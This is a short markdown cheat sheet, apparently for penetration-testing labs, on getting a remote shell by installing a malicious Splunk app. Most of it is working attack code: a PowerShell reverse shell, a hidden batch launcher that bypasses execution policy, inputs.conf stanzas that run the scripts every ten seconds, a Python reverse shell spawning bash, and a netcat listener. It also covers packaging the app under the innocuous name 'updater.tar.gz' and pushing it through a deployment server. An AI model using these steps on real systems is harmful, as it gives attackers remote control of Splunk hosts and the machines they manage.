# Attacking Splunk

## 1. Create App Directory Structure

```bash
mkdir -p splunk_shell/splunk_shell/bin
mkdir -p splunk_shell/splunk_shell/default
tree splunk_shell/splunk_shell/
```

---

## 2. PowerShell Reverse Shell (Windows)

**File:** `splunk_shell/splunk_shell/bin/rev.ps1`

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

---

## 3. Batch File to Execute PowerShell (Windows)

**File:** `splunk_shell/splunk_shell/bin/run.bat`

```batch
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

---

## 4. Splunk App Configuration (Windows)

**File:** `splunk_shell/splunk_shell/default/inputs.conf`

```ini
[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

---

## 5. Package the App

```bash
tar -cvzf updater.tar.gz splunk_shell/splunk_shell/
```

---

## 6. Set Up Listener

```bash
nc -lnvp 443
```

---

## 7. Upload the Splunk App

* Navigate to **Apps - Manage Apps - Install app from file**.
* Upload `updater.tar.gz`.

---

## 8. Python Reverse Shell (Linux)

**File:** `splunk_shell/splunk_shell/bin/rev.py`

```python
import sys, socket, os, pty
ip = "10.10.14.15"
port = 443
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')
```

---

## 9. Splunk App Configuration (Linux)

**File:** `splunk_shell/splunk_shell/default/inputs.conf`

```ini
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell
```

---

## 10. Deploy the App to a Deployment Server

### Windows

```bash
cp updater.tar.gz $SPLUNK_HOME/etc/deployment-apps/
splunk restart
```

### Linux

```bash
cp updater.tar.gz $SPLUNK_HOME/etc/deployment-apps/
sudo systemctl restart splunk
```
